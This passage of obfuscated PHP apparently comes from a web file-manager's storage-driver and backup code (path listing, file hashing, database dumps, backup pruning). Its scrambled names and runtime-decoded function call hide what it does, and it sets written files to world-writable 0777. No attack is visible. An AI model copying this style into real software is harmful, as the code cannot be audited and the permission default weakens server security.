$aó“£ñ¨¡™; } public function exist($D“ñ‰İ§½Ó) { $D“ñ‰İ§½Ó = $this->iconvSystem($D“ñ‰İ§½Ó); return @file_exists($D“ñ‰İ§½Ó); } public function isFile($E‘„¾šöÁ) { $E‘„¾šöÁ = $this->iconvSystem($E‘„¾šöÁ); return @is_file($E‘„¾šöÁ); } public function isFolder($B¸î…²ŠË) { $B¸î…²ŠË = $this->iconvSystem($B¸î…²ŠË); return @is_dir($B¸î…²ŠË); } public function listPath($cÑŒÓª—Èè, $CÆÚÜë¾‡ì = false) { goto a¨…ƒ‘«‡Ş; Aø´ïë: $C‹íªÀÚ = array($b„ä¬¥­’í[85] => array(), $b„ä¬¥­’í[84] => array()); if (!($BŸ×ÙøŒ’Œ = @opendir($cÑŒÓª—Èè))) { return $C‹íªÀÚ; } while (($cÄĞâ©Ï† = readdir($BŸ×ÙøŒ’Œ)) !== !1) { if ($cÄĞâ©Ï† == $b„ä¬¥­’í[105] || $cÄĞâ©Ï† == $b„ä¬¥­’í[1253]) { continue; } $B…İÈ¹ìèé = $cÑŒÓª—Èè . $cÄĞâ©Ï†; if (is_file($B…İÈ¹ìèé)) { $C‹íªÀÚ[$b„ä¬¥­’í[84]][] = $this->fileInfo($B…İÈ¹ìèé, $CÆÚÜë¾‡ì); } else { $C‹íªÀÚ[$b„ä¬¥­’í[85]][] = $this->folderInfo($B…İÈ¹ìèé, $CÆÚÜë¾‡ì); } } goto E„±ƒÛŸÁ; a¨…ƒ‘«‡Ş: $b„ä¬¥­’í =& $_SERVER[Ü˜]; $cÑŒÓª—Èè = $this->iconvSystem($cÑŒÓª—Èè); $cÑŒÓª—Èè = rtrim($cÑŒÓª—Èè, $b„ä¬¥­’í[8]) . $b„ä¬¥­’í[8]; goto Aø´ïë; E„±ƒÛŸÁ: closedir($BŸ×ÙøŒ’Œ); return $C‹íªÀÚ; goto d×É…˜Ù«ì; d×É…˜Ù«ì: } public function listAll($fà³ªÆÌ¦, &$eâšø„æ = array()) { goto b«Ã¨Ë—®ˆ; b«Ã¨Ë—®ˆ: $fİ¢¼Ó¾Ëæ =& $_SERVER[Ü˜]; $fà³ªÆÌ¦ = $this->iconvSystem($fà³ªÆÌ¦); $fà³ªÆÌ¦ = rtrim($fà³ªÆÌ¦, $fİ¢¼Ó¾Ëæ[8]) . $fİ¢¼Ó¾Ëæ[8]; goto FÇ×Œ‰À; Dé‘Õ‹ãî×: return $eâšø„æ; goto DâêßÚÂ¡…; FÇ×Œ‰À: if (!($cÃè¿“÷ = @opendir($fà³ªÆÌ¦))) { return $eâšø„æ; } while (($F–ÁŠ™Ş÷™ = readdir($cÃè¿“÷)) !== !1) { if ($F–ÁŠ™Ş÷™ == $fİ¢¼Ó¾Ëæ[105] || $F–ÁŠ™Ş÷™ == $fİ¢¼Ó¾Ëæ[1253]) { continue; } $a‹Ç•š¶î = $fà³ªÆÌ¦ . $F–ÁŠ™Ş÷™; if (is_dir($a‹Ç•š¶î) && !is_link($a‹Ç•š¶î)) { $eâšø„æ[] = array($fİ¢¼Ó¾Ëæ[86] => $a‹Ç•š¶î . $fİ¢¼Ó¾Ëæ[8], $fİ¢¼Ó¾Ëæ[87] => 1, $fİ¢¼Ó¾Ëæ[94] => @filemtime($a‹Ç•š¶î), $fİ¢¼Ó¾Ëæ[88] => 0); $this->listAll($a‹Ç•š¶î, $eâšø„æ); } else { $eâšø„æ[] = array($fİ¢¼Ó¾Ëæ[86] => $a‹Ç•š¶î, $fİ¢¼Ó¾Ëæ[87] => 0, $fİ¢¼Ó¾Ëæ[94] => @filemtime($a‹Ç•š¶î), $fİ¢¼Ó¾Ëæ[88] => $this->size($a‹Ç•š¶î)); } } closedir($cÃè¿“÷); goto Dé‘Õ‹ãî×; DâêßÚÂ¡…: } public function has($e®š‚†è†½, $E‰á×Û›Ä³ = false, $FÖÃÓÒÈã = true) { goto C´‰¬”ø¨Š; B‚ãÅ‹İŠ: if (!($AØ¸çÑçÌ = @opendir($e®š‚†è†½))) { return !1; } $c‡¿¢‚ô“• = 0; $BĞì°’ƒæ = 0; goto EŠÚÆ ïĞ; c¨®£×ÍçÃ: if ($E‰á×Û›Ä³) { return array($dÃÁŠ–Íº¸[213] => $c‡¿¢‚ô“•, $dÃÁŠ–Íº¸[214] => $BĞì°’ƒæ); } return !1; goto D®‚ƒ„íÖŠ; C´‰¬”ø¨Š: $dÃÁŠ–Íº¸ =& $_SERVER[Ü˜]; $e®š‚†è†½ = $this->iconvSystem($e®š‚†è†½); $e®š‚†è†½ = rtrim($e®š‚†è†½, $dÃÁŠ–Íº¸[8]) . $dÃÁŠ–Íº¸[8]; goto B‚ãÅ‹İŠ; EŠÚÆ ïĞ: $BÛï‡’Ùµ« = 0; while (($D÷ß•Ú­õì = readdir($AØ¸çÑçÌ)) !== !1) { if ($D÷ß•Ú­õì == $dÃÁŠ–Íº¸[105] || $D÷ß•Ú­õì == $dÃÁŠ–Íº¸[1253]) { continue; } $a´®âîÆƒ = $e®š‚†è†½ . $D÷ß•Ú­õì; if ($E‰á×Û›Ä³) { $BÛï‡’Ùµ«++; if (@is_file($a´®âîÆƒ)) { $c‡¿¢‚ô“•++; } else { $BĞì°’ƒæ++; } if ($BÛï‡’Ùµ« > 10000) { break; } continue; } if ($FÖÃÓÒÈã) { if (@is_file($a´®âîÆƒ)) { return !0; } } else { if (@is_dir($a´®âîÆƒ . $dÃÁŠ–Íº¸[8])) { return !0; } } } closedir($AØ¸çÑçÌ); goto c¨®£×ÍçÃ; D®‚ƒ„íÖŠ: } public function hashSimple($b®ƒêÕÆ¶) { goto D¦®Ş¯­ Ü; Bµ—Ëç½„Ä: return md5($d†³°’åğĞ) . $Aõ»Œ…İã; goto cè¹®œÜ†¬; b”äğê¤‡: fseek_64($aåìàŒ‡µ, $Aõ»Œ…İã - $fì„îìŒ¼); $d†³°’åğĞ .= fread($aåìàŒ‡µ, $fì„îìŒ¼); fclose($aåìàŒ‡µ); goto Bµ—Ëç½„Ä; aö£Œ•ò×: $Aõ»Œ…İã = $this->size($b®ƒêÕÆ¶); $fì„îìŒ¼ = 200; $E¿µ³‘®‹ğ = 50; goto E‚ö®‚; E‚ö®‚: if ($Aõ»Œ…İã <= $fì„îìŒ¼ * $E¿µ³‘®‹ğ) { return $this->hashMd5($b®ƒêÕÆ¶) . $Aõ»Œ…İã; } $d†³°’åğĞ = $AŒÌ¶İè¹®[33]; $b±‘Ñ‹Û¦ª = intval($Aõ»Œ…İã / $E¿µ³‘®‹ğ); goto AºÏù«—«‹; AºÏù«—«‹: $aåìàŒ‡µ = fopen($b®ƒêÕÆ¶, $AŒÌ¶İè¹®[1260]); if (!$aåìàŒ‡µ) { return $d†³°’åğĞ; } for ($C­êìÜËÕª = 0; $C­êìÜËÕª < $E¿µ³‘®‹ğ; $C­êìÜËÕª++) { fseek_64($aåìàŒ‡µ, $b±‘Ñ‹Û¦ª * $C­êìÜËÕª); $d†³°’åğĞ .= fread($aåìàŒ‡µ, $fì„îìŒ¼); } goto b”äğê¤‡; D¦®Ş¯­ Ü: $AŒÌ¶İè¹® =& $_SERVER[Ü˜]; if (!$b®ƒêÕÆ¶) { return md5($AŒÌ¶İè¹®[33]); } $b®ƒêÕÆ¶ = $this->iconvSystem($b®ƒêÕÆ¶); goto aö£Œ•ò×; cè¹®œÜ†¬: } public function getContent($EÒš¹Ş±ÉĞ) { $EÒš¹Ş±ÉĞ = $this->iconvSystem($EÒš¹Ş±ÉĞ); return file_get_contents($EÒš¹Ş±ÉĞ); } public function setContent($bÏéÏÉ‹Ú§, $F»Ÿß®™ùè = '') { $bÏéÏÉ‹Ú§ = $this->iconvSystem($bÏéÏÉ‹Ú§); $fèÛöñÉİØ = @file_put_contents($bÏéÏÉ‹Ú§, $F»Ÿß®™ùè, LOCK_EX); clearstatcache(); @chmod($bÏéÏÉ‹Ú§, 511); return $fèÛöñÉİØ === !1 ? !1 : !0; } public function fileSubstr($c¶¹ßÁ°Šë, $D„‹Ó’›œ¿ = 0, $A›Íè‰½„ = false) { goto cÉŒÈ£éí; cÉŒÈ£éí: $dè¥íÀßÚÍ =& $_SERVER[Ü˜]; $c¶¹ßÁ°Šë = $this->iconvSystem($c¶¹ßÁ°Šë); if ($A›Íè‰½„ === !1) { $A›Íè‰½„ = $this->size($c¶¹ßÁ°Šë); } goto CÄ‡®¤¤ÁÃ; dªÇ•¢ö±®: fseek_64($b¥°×³Š¡Ã, $D„‹Ó’›œ¿); $Bä‘ø‡ïÒï = fread($b¥°×³Š¡Ã, $A›Íè‰½„); fclose($b¥°×³Š¡Ã); goto fÖ¢×±‘±à; fÖ¢×±‘±à: return $Bä‘ø‡ïÒï; goto bÔ¨…ó×; CÄ‡®¤¤ÁÃ: if ($A›Íè‰½„ <= 0) { return $dè¥íÀßÚÍ[33]; } $b¥°×³Š¡Ã = fopen($c¶¹ßÁ°Šë, $dè¥íÀßÚÍ[1260]); if (!$b¥°×³Š¡Ã) { return !1; } goto dªÇ•¢ö±®; bÔ¨…ó×: } public function upload($fÃ­»¥©‰ñ, $fŸãºöÌ‘, $d®º÷¨”¾ = false, $eóŒË†„¡» = REPEAT_REPLACE) { if ($d®º÷¨”¾) { return $this->moveFile($fŸãºöÌ‘, $fÃ­»¥©‰ñ); } return $this->copyFile($fŸãºöÌ‘, $fÃ­»¥©‰ñ); } public function setModifyTime($eó“Ñ¸ŸøÚ, $D·ç‹Ø¸Õí = '') { @touch($eó“Ñ¸ŸøÚ, intval($D·ç‹Ø¸Õí)); } public function download($c˜¹ÖìÒƒ, $f–İº›À£Á) { return $this->iconvSystem($c˜¹ÖìÒƒ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fˆ‹ìØÓ®ó) { parent::__construct($fˆ‹ìØÓ®ó); $this->signatureVersion($_SERVER[Ü˜][222]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($fë”ß½æÕ‰) { parent::__construct($fë”ß½æÕ‰); $this->signatureVersion($_SERVER[Ü˜][222]); } public function fileOutLink($Fò‰ï¬ø°à) { $C•‰†Ïï­¤ =& $_SERVER[Ü˜]; if (substr($Fò‰ï¬ø°à, 0, 7) == $C•‰†Ïï­¤[1205]) { $Fò‰ï¬ø°à = $C•‰†Ïï­¤[1206] . substr($Fò‰ï¬ø°à, 7); } header($C•‰†Ïï­¤[169] . $Fò‰ï¬ø°à); die; } } goto fŞ²›³±íÔ; EŠÇø¬øó: $eÖÃÔ…–Ø¡ = strrev(base64_decode($_SERVER[øä][0])); function binCheckNeq($DŠà—½õÅè, $B¡ÉÛø®ç°) { return $DŠà—½õÅè != $B¡ÉÛø®ç°; } $_SERVER[$_SERVER[øä][1]] = $eÖÃÔ…–Ø¡($_SERVER[$_SERVER[øä][2]]); goto C³ó…ÀÚ; f¦À¦–Œ‚«: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $D†·«¦«ã± =& $_SERVER[Ü˜]; $this->isManual(); self::$name = date($D†·«¦«ã±[717]); if (!($dÁ¯Å½‰ë = Model($D†·«¦«ã±[718])->lastItem())) { $dÁ¯Å½‰ë = $this->initData(); } else { self::$name = $dÁ¯Å½‰ë[$D†·«¦«ã±[28]]; if ($dÁ¯Å½‰ë[$D†·«¦«ã±[719]] == $D†·«¦«ã±[97]) { self::$name = date($D†·«¦«ã±[720]); $eÖõÍ˜ˆğĞ = 0; if (isset($dÁ¯Å½‰ë[$D†·«¦«ã±[300]][$D†·«¦«ã±[203]][$D†·«¦«ã±[456]])) { $eÖõÍ˜ˆğĞ = (int) $dÁ¯Å½‰ë[$D†·«¦«ã±[300]][$D†·«¦«ã±[203]][$D†·«¦«ã±[456]]; } if (self::$manual == 0 && $dÁ¯Å½‰ë[$D†·«¦«ã±[28]] == self::$name) { Model($D†·«¦«ã±[718])->remove($dÁ¯Å½‰ë[$D†·«¦«ã±[402]]); } $dÁ¯Å½‰ë = $this->initData($eÖõÍ˜ˆğĞ, $dÁ¯Å½‰ë[$D†·«¦«ã±[721]]); } else { $this->checkStore($dÁ¯Å½‰ë[$D†·«¦«ã±[721]]); } } self::$option = $dÁ¯Å½‰ë; } private function isManual() { $d¡”øå†» = _get($GLOBALS, $_SERVER[Ü˜][722], 0); $d¡”øå†» = intval($d¡”øå†»); self::$manual = $d¡”øå†» && $d¡”øå†» == 1 ? 1 : 0; } private function initData($B¿ˆ§ãó›¡ = 0, $bªê¦äÀØ = '') { goto F‰–âè±¿Æ; C¤…İÍ£: $AÆ’¡…Åˆ = Model($DŞÂƒÓÂì…[718])->insert($FäÍ‹Š—Á¡); $FäÍ‹Š—Á¡[$DŞÂƒÓÂì…[402]] = $AÆ’¡…Åˆ; return $FäÍ‹Š—Á¡; goto döâëĞ’¶§; déç£¸½ÍÆ: $this->checkStore($EçÌê¾ãİ¢[$DŞÂƒÓÂì…[721]]); if (self::$manual == 1) { self::$name .= $DŞÂƒÓÂì…[81] . date($DŞÂƒÓÂì…[723]); } $FäÍ‹Š—Á¡ = array($DŞÂƒÓÂì…[721] => $EçÌê¾ãİ¢[$DŞÂƒÓÂì…[721]], $DŞÂƒÓÂì…[28] => self::$name, $DŞÂƒÓÂì…[719] => 0, $DŞÂƒÓÂì…[724] => $EçÌê¾ãİ¢[$DŞÂƒÓÂì…[724]], $DŞÂƒÓÂì…[725] => self::$manual, $DŞÂƒÓÂì…[300] => array($DŞÂƒÓÂì…[726] => array($DŞÂƒÓÂì…[719] => 0), $DŞÂƒÓÂì…[727] => array($DŞÂƒÓÂì…[719] => 0, $DŞÂƒÓÂì…[728] => 0, $DŞÂƒÓÂì…[729] => 0, $DŞÂƒÓÂì…[29] => $DŞÂƒÓÂì…[33], $DŞÂƒÓÂì…[730] => 0, $DŞÂƒÓÂì…[485] => 0), $DŞÂƒÓÂì…[731] => array($DŞÂƒÓÂì…[719] => 0, $DŞÂƒÓÂì…[728] => 0, $DŞÂƒÓÂì…[729] => 0, $DŞÂƒÓÂì…[730] => 0, $DŞÂƒÓÂì…[485] => 0), $DŞÂƒÓÂì…[203] => array($DŞÂƒÓÂì…[719] => 0, $DŞÂƒÓÂì…[732] => 0, $DŞÂƒÓÂì…[733] => 0, $DŞÂƒÓÂì…[734] => 0, $DŞÂƒÓÂì…[735] => 0, $DŞÂƒÓÂì…[456] => $B¿ˆ§ãó›¡, $DŞÂƒÓÂì…[730] => 0, $DŞÂƒÓÂì…[485] => 0)), $DŞÂƒÓÂì…[730] => time(), $DŞÂƒÓÂì…[485] => 0); goto C¤…İÍ£; F‰–âè±¿Æ: $DŞÂƒÓÂì… =& $_SERVER[Ü˜]; $EçÌê¾ãİ¢ = Model($DŞÂƒÓÂì…[718])->config(); if ($bªê¦äÀØ && $EçÌê¾ãİ¢[$DŞÂƒÓÂì…[721]] != $bªê¦äÀØ) { $B¿ˆ§ãó›¡ = 0; } goto déç£¸½ÍÆ; döâëĞ’¶§: } private function checkStore($B•×ğÄ³Ù²) { $CÚøºó¤í =& $_SERVER[Ü˜]; $c Ü‹Ü…„¿ = Model($CÚøºó¤í[736])->listData($B•×ğÄ³Ù²); Model($CÚøºó¤í[736])->checkConfig($c Ü‹Ü…„¿); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Ü˜][718])->findByName(self::$name); } return self::$option; } public static function set($AîÀìŠêˆ) { $aÍ‡Öåƒó =& $_SERVER[Ü˜]; $E±¢ëœÕ® = self::get(); foreach ($AîÀìŠêˆ as $Dæ¿£æè» => $F¤ÍÍ¨ª¯‘) { $DÈ®˜ÕÓâ— = explode($aÍ‡Öåƒó[105], $Dæ¿£æè»); $C“Å‘ÈİÑ‘ = count($DÈ®˜ÕÓâ—); switch ($C“Å‘ÈİÑ‘) { case 1: $E±¢ëœÕ®[$DÈ®˜ÕÓâ—[0]] = $F¤ÍÍ¨ª¯‘; break; case 2: $E±¢ëœÕ®[$DÈ®˜ÕÓâ—[0]][$DÈ®˜ÕÓâ—[1]] = $F¤ÍÍ¨ª¯‘; break; case 3: $E±¢ëœÕ®[$DÈ®˜ÕÓâ—[0]][$DÈ®˜ÕÓâ—[1]][$DÈ®˜ÕÓâ—[2]] = $F¤ÍÍ¨ª¯‘; break; } } Model($aÍ‡Öåƒó[718])->update($E±¢ëœÕ®[$aÍ‡Öåƒó[402]], $E±¢ëœÕ®); self::$option = $E±¢ëœÕ®; return self::$option; } public function keep() { $Fš…ªŞîŞ =& $_SERVER[Ü˜]; $bÇ—êìĞ = self::get(); if ($bÇ—êìĞ[$Fš…ªŞîŞ[300]][$Fš…ªŞîŞ[726]][$Fš…ªŞîŞ[719]] == $Fš…ªŞîŞ[97]) { return; } $this->backupKeep($bÇ—êìĞ); self::set(array($Fš…ªŞîŞ[737] => 1)); } private function backupKeep($AÓåŒãô¬ó) { goto BÌ¤ÕŸ¾Œ‘; BÌ¤ÕŸ¾Œ‘: $aµ¼›£¶’è =& $_SERVER[Ü˜]; if (self::$manual == 1) { return; } $b¦£Ë÷«Â” = Model($aµ¼›£¶’è[718])->listData(); goto EÀó™çí‡ø; EÀó™çí‡ø: if (empty($b¦£Ë÷«Â”)) { return; } $AÔ™´ôŸº = 0; $eÏìÂ¿’ÑŸ = array(); goto D—ÁĞŠ’Ã; D—ÁĞŠ’Ã: foreach ($b¦£Ë÷«Â” as $B²—êöÛ¿Á) { if ($AÔ™´ôŸº >= 7) { break; } $eÏìÂ¿’ÑŸ[] = $B²—êöÛ¿Á[$aµ¼›£¶’è[28]]; $AÔ™´ôŸº++; } for ($AÔ™´ôŸº = 0; $AÔ™´ôŸº < 12; $AÔ™´ôŸº++) { $eÏìÂ¿’ÑŸ[] = date($aµ¼›£¶’è[738], strtotime("\55{$AÔ™´ôŸº}\x20\x6d\157\156\x74\x68\x73")); } $eÏìÂ¿’ÑŸ = array_unique($eÏìÂ¿’ÑŸ); goto Dè½¬ÆéÖ³; Dè½¬ÆéÖ³: $BÆö´“† = Model($aµ¼›£¶’è[739])->get($aµ¼›£¶’è[740]); foreach ($b¦£Ë÷«Â” as $B²—êöÛ¿Á) { if (isset($B²—êöÛ¿Á[$aµ¼›£¶’è[725]]) && $B²—êöÛ¿Á[$aµ¼›£¶’è[725]] == $aµ¼›£¶’è[97]) { continue; } if (!empty($B²—êöÛ¿Á[$aµ¼›£¶’è[28]]) && in_array($B²—êöÛ¿Á[$aµ¼›£¶’è[28]], $eÏìÂ¿’ÑŸ)) { continue; } Model($aµ¼›£¶’è[718])->remove($B²—êöÛ¿Á[$aµ¼›£¶’è[402]]); $A’ÆÜ«…™Í = $this->backupPath($AÓåŒãô¬ó, $BÆö´“†); IO::remove($A’ÆÜ«…™Í, !1); } goto C–¨íƒš†ô; C–¨íƒš†ô: } private function backupPath($A“ÒÛÔÇ°±, $e± èßĞ© = false) { $E‚óÙ¸ŒÈà =& $_SERVER[Ü˜]; if (!$e± èßĞ©) { $e± èßĞ© = Model($E‚óÙ¸ŒÈà[739])->get($E‚óÙ¸ŒÈà[740]); } $fÀæŠ“…¥ = $A“ÒÛÔÇ°±[$E‚óÙ¸ŒÈà[28]]; $C…¨³Á‡…â = substr(md5($E‚óÙ¸ŒÈà[741] . $e± èßĞ© . $fÀæŠ“…¥), 0, 8); return "\173\151\x6f\x3a{$A“ÒÛÔÇ°±[$E‚óÙ¸ŒÈà[721]]}\x7d\57\x64\141\x74\x61\x62\141\163\x65\57\x62\141\143\x6b\165\160\x2f" . $fÀæŠ“…¥ . $E‚óÙ¸ŒÈà[81] . $C…¨³Á‡…â; } public function db() { goto aŒÙçŠ÷Òˆ; aŒÙçŠ÷Òˆ: $FŒÈŸæ¡ğ =& $_SERVER[Ü˜]; $F‚ëà”‡¶‹ = self::get(); if ($F‚ëà”‡¶‹[$FŒÈŸæ¡ğ[300]][$FŒÈŸæ¡ğ[727]][$FŒÈŸæ¡ğ[719]] == $FŒÈŸæ¡ğ[97]) { return !0; } goto c¹‹ƒÃ·Ç‹; F†òò‹­™: return !0; goto d‹ÅÑã„‹Ì; c¹‹ƒÃ·Ç‹: $bØğ…’ä“¦ = new BackupDb(); if (!$bØğ…’ä“¦->index()) { return !1; } self::set(array($FŒÈŸæ¡ğ[742] => 1)); goto F†òò‹­™; d‹ÅÑã„‹Ì: } public function dbFile() { goto bö™³ŠÛº†; bö™³ŠÛº†: $cá‡®ƒ“‡ =& $_SERVER[Ü˜]; $B¥÷œÍÎ–… = self::get(); if ($B¥÷œÍÎ–…[$cá‡®ƒ“‡[300]][$cá‡®ƒ“‡[731]][$cá‡®ƒ“‡[719]] == $cá‡®ƒ“‡[97]) { return !0; } goto C ‘ˆâ”Ÿé; aÌŒ½‹ä„: return !0; goto CĞ„Ì‘ÁÄè; C ‘ˆâ”Ÿé: $a‹ã‘Éåáù = new BackupDbFile(); if (!$a‹ã‘Éåáù->index()) { return !1; } self::set(array($cá‡®ƒ“‡[743] => 1)); goto aÌŒ½‹ä„; CĞ„Ì‘ÁÄè: } public function file() { $C¹¨á¦“´« =& $_SERVER[Ü˜]; $c» ’â¥Œõ = self::get(); if ($c» ’â¥Œõ[$C¹¨á¦“´«[300]][$C¹¨á¦“´«[203]][$C¹¨á¦“´«[719]] == $C¹¨á¦“´«[97]) { return !0; } if (!isset($c» ’â¥Œõ[$C¹¨á¦“´«[724]]) || $c» ’â¥Œõ[$C¹¨á¦“´«[724]] == $C¹¨á¦“´«[201]) { $CÎ”¸’êÙÖ = new BackupFile(); if (!$CÎ”¸’êÙÖ->index()) { return !1; } } self::set(array($C¹¨á¦“´«[744] => 1, $C¹¨á¦“´«[719] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Fàò²µôè¹; fŞâ„¿ÈŸÉ: self::$name = $e–¡õµÀöç[$CÀíñô¹ô[28]]; $aö‰âÌ†ğ = $GLOBALS[$CÀíñô¹ô[6]][$CÀíñô¹ô[17]]; $aø„Ò¯Å¹ø = $this->_dbType($aö‰âÌ†ğ); goto aƒ…Œ¾•ŠÓ; Fàò²µôè¹: $CÀíñô¹ô =& $_SERVER[Ü˜]; $e–¡õµÀöç = Backup::get(); self::$io = $e–¡õµÀöç[$CÀíñô¹ô[721]]; goto fŞâ„¿ÈŸÉ; f¬¯ËÌîÔ: if (isset($DØ¢ïË¾Ø->task[$CÀíñô¹ô[757]])) { $bëÄ‘‘µ¯ = $DØ¢ïË¾Ø->task[$CÀíñô¹ô[757]] ? $DØ¢ïË¾Ø->task[$CÀíñô¹ô[757]] : timeFloat(); $DØâ®Ë±¬ª = $bëÄ‘‘µ¯ - $DØ¢ïË¾Ø->task[$CÀíñô¹ô[758]]; if ($DØâ®Ë±¬ª >= 0.2) { $A˜‚‡‹±ÆÃ += 1; } } $DØ¢ïË¾Ø->end(); $A–Šô³ÄØ = array($CÀíñô¹ô[745] => $aø„Ò¯Å¹ø, $CÀíñô¹ô[742] => 1, $CÀíñô¹ô[759] => $A˜‚‡‹±ÆÃ, $CÀíñô¹ô[760] => $dÑºÏõ²Áö, $CÀíñô¹ô[761] => time()); goto aÍ½¥ÚÎ; Dº«‚ÜÑ£æ: foreach ($EÆ½ÊÑÖÈ¯ as $cÄ’ÇœÉŸÁ) { $A˜‚‡‹±ÆÃ += $Eºá­ãØôù->model($cÄ’ÇœÉŸÁ)->count(); } $DØ¢ïË¾Ø = new Task($CÀíñô¹ô[750], $CÀíñô¹ô[751], $A˜‚‡‹±ÆÃ, LNG($CÀíñô¹ô[752]) . $CÀíñô¹ô[753] . LNG($CÀíñô¹ô[754])); foreach ($EÆ½ÊÑÖÈ¯ as $cÄ’ÇœÉŸÁ) { $BÉäß¾ğ’ = $bæêÙöÌîÉ . $cÄ’ÇœÉŸÁ . $CÀíñô¹ô[755]; $BÁÖ¦•…±‘ = null; if ($cÄ’ÇœÉŸÁ == $CÀíñô¹ô[756] && (!isset($e–¡õµÀöç[$CÀíñô¹ô[724]]) || $e–¡õµÀöç[$CÀíñô¹ô[724]] == $CÀíñô¹ô[201])) { $BÁÖ¦•…±‘ = self::$io; } $dÑºÏõ²Áö += $Eºá­ãØôù->sqlFromDb($cÄ’ÇœÉŸÁ, $BÉäß¾ğ’, $DØ¢ïË¾Ø, $BÁÖ¦•…±‘); } goto f¬¯ËÌîÔ; Cá×šàÊ§×: $A˜‚‡‹±ÆÃ = $dÑºÏõ²Áö = 0; try { $EÆ½ÊÑÖÈ¯ = $Eºá­ãØôù->db()->getTables(); } catch (Exception $A®¿š®òƒ¡) { return !1; } $EÆ½ÊÑÖÈ¯ = array_diff($EÆ½ÊÑÖÈ¯, array($CÀíñô¹ô[748], $CÀíñô¹ô[749])); goto Dº«‚ÜÑ£æ; fùÉ¤™ö‘: $bæêÙöÌîÉ = $this->tmpFilesPath() . $CÀíñô¹ô[747] . self::$name . $CÀíñô¹ô[8]; del_dir($bæêÙöÌîÉ); mk_dir($bæêÙöÌîÉ); goto Cá×šàÊ§×; aƒ…Œ¾•ŠÓ: $Eºá­ãØôù = new DbManage($aö‰âÌ†ğ, $aø„Ò¯Å¹ø); $A–Šô³ÄØ = array($CÀíñô¹ô[745] => $aø„Ò¯Å¹ø, $CÀíñô¹ô[746] => time()); Backup::set($A–Šô³ÄØ); goto fùÉ¤™ö‘; aÍ½¥ÚÎ: Backup::set($A–Šô³ÄØ); if ($A˜‚‡‹±ÆÃ > $dÑºÏõ²Áö) { write_log(array($CÀíñô¹ô[762], $A–Šô³ÄØ), $CÀíñô¹ô[751]); return !1; } return !0; goto AÁÔÇ’ÊÛ; AÁÔÇ’ÊÛ: } private function _dbType($a—éò­÷éÕ) { goto A­Ú«–÷; d†Í’ùÚÌ: return $D©Ü‡¿Ğ˜Ã; goto Dù‘»Ã¢õÁ; aŞ¨ôİ¸‘ƒ: if ($D©Ü‡¿Ğ˜Ã == $E•ìòò×›ä[764]) { $Eôğó˜¶åÒ = explode($E•ìòò×›ä[4], $a—éò­÷éÕ[$E•ìòò×›ä[765]]); $D©Ü‡¿Ğ˜Ã = $Eôğó˜¶åÒ[0]; } $CĞ”ó‡Õåä = array($E•ìòò×›ä[766] => $E•ìòò×›ä[9], $E•ìòò×›ä[767] => $E•ìòò×›ä[768]); if (isset($CĞ”ó‡Õåä[$D©Ü‡¿Ğ˜Ã])) { $D©Ü‡¿Ğ˜Ã = $CĞ”ó‡Õåä[$D©Ü‡¿Ğ˜Ã]; } goto d†Í’ùÚÌ; A­Ú«–÷: $E•ìòò×›ä =& $_SERVER[Ü˜]; $a—éò­÷éÕ = array_change_key_case($a—éò­÷éÕ); $D©Ü‡¿Ğ˜Ã = $a—éò­÷éÕ[$E•ìòò×›ä[763]]; goto aŞ¨ôİ¸‘ƒ; Dù‘»Ã¢õÁ: } private function tmpFilesPath() { $EÏ—õƒì‰ =& $_SERVER[Ü˜]; $Cº˜Ñ…ÁÊÂ = TEMP_FILES; if ($GLOBALS[$EÏ—õƒì‰[6]][$EÏ—õƒì‰[98]][$EÏ—õƒì‰[769]]) { $Cº˜Ñ…ÁÊÂ = $GLOBALS[$EÏ—õƒì‰[6]][$EÏ—õƒì‰[98]][$EÏ—õƒì‰[769]]; if (!mk_dir($Cº˜Ñ…ÁÊÂ) || !is_writable($Cº˜Ñ…ÁÊÂ) || !IO::mkfile($Cº˜Ñ…ÁÊÂ . $EÏ—õƒì‰[770])) { $Cº˜Ñ…ÁÊÂ = TEMP_FILES; } } return $Cº˜Ñ…ÁÊÂ; } } class BackupDbFile { public function __construct() { } public function index() { goto D³®Òºˆâ²; eâÛŠªñËõ: $eƒŸÜÀ±·É = $this->tmpFilesPath() . "\142\x61\x63\153\165\x70\x5f{$C¨ŠìŠ÷®Ì}\x2f"; $F¤Ÿ´éÏ“ä = $this->backupPath($b¦¤Îï‡î¾); if (!($F¤Ÿ´éÏ“ä = IO::mkdir($F¤Ÿ´éÏ“ä))) { return !1; } goto cœÁ†ÊÙ¨é; däÀÔâÓí¸: $f·°éÎ·Ó = CONTROLLER_DIR . $A¨ÏíùƒÑ[777]; $aÅì•Ûìˆ = CONTROLLER_DIR . $A¨ÏíùƒÑ[778]; IO::copy($f·°éÎ·Ó, $F¤Ÿ´éÏ“ä); goto d˜Ã¿ë¥…Î; e•è˜«éŸ„: Backup::set($aˆòÛ£Ë‚ê); return !0; goto båß¤™Ğ™; D‚êÕ‘¢‰­: if (!$cØÃ¢ìœö) { return !1; } $aˆòÛ£Ë‚ê = array($A¨ÏíùƒÑ[771] => $cØÃ¢ìœö, $A¨ÏíùƒÑ[772] => time()); Backup::set($aˆòÛ£Ë‚ê); goto aÛÎ­†ø; D³®Òºˆâ²: $A¨ÏíùƒÑ =& $_SERVER[Ü˜]; $b¦¤Îï‡î¾ = Backup::get(); $C¨ŠìŠ÷®Ì = $b¦¤Îï‡î¾[$A¨ÏíùƒÑ[28]]; goto eâÛŠªñËõ; d˜Ã¿ë¥…Î: IO::copy($aÅì•Ûìˆ, $F¤Ÿ´éÏ“ä); $E¦†«‘©”×->end(); $aˆòÛ£Ë‚ê = array($A¨ÏíùƒÑ[779] => $cØÃ¢ìœö, $A¨ÏíùƒÑ[780] => time()); goto e•è˜«éŸ„; cœÁ†ÊÙ¨é: $bšÌí„Ù–Š = IO::listPath($eƒŸÜÀ±·É); $c“¾»»ÉÛ§ = isset($bšÌí„Ù–Š[$A¨ÏíùƒÑ[84]]) ? $bšÌí„Ù–Š[$A¨ÏíùƒÑ[84]] : array(); $cØÃ¢ìœö = array_sum(array_column($c“¾»»ÉÛ§, $A¨ÏíùƒÑ[88])); goto D‚êÕ‘¢‰­; aÛÎ­†ø: $E¦†«‘©”× = new TaskFileTransfer($A¨ÏíùƒÑ[773], 